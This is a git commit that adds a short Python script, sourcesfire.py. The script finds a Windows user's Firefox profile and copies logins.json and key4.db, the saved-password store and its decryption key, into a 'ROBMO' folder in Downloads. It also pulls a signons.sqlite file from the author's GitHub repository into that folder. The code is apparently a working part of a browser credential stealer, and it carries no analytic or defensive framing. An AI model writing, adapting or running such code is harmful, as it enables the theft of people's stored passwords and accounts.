8f2c94d5ce8b3c052b56b0fc61ab926603217007
matiasb186 <86837307+matiasb186@users.noreply.github.com>
2023-10-20 12:17:59 -0500

    Create sourcesfire.py

---
+++ sourcesfire.py
@@ -0,0 +1,41 @@
+import os
+import requests
+import getpass
+import shutil
+
+user = os.path.expanduser("~")
+
+def get_signons(user):
+    git = "https://github.com/matiasb186/Robmo-Logs/raw/main/signons.sqlite"
+    download = os.path.join("C:/Users", user, "Downloads")
+    robmo = os.path.join(download, "ROBMO")
+    if not os.path.exists(robmo):
+        os.mkdir(robmo)
+    file = os.path.join(robmo, "signons.sqlite")
+    response = requests.get(git)
+    if response.status_code == 200:
+        with open(file, 'wb') as file:
+            file.write(response.content)
+
+def fire_profile(user):
+    profiles = os.path.join("C:/Users", user, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles")
+    
+    for root, dirs, files in os.walk(profiles):
+        for profile in dirs:
+            if 'default-release' in profile:
+                return profile
+    return None
+
+def copy(user, profile, destination):
+    source = os.path.join("C:/Users", user, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles", profile)
+    logins = os.path.join(source, "logins.json")
+    key = os.path.join(source, "key4.db")
+    
+    shutil.copy(logins, os.path.join(destination, "logins.json"))
+    shutil.copy(key, os.path.join(destination, "key4.db"))
+
+firefox_profile = fire_profile(user)
+
+get_signons(user)
+
+copy(user, firefox_profile, os.path.join("C:/Users", user, "Downloads", "ROBMO"))
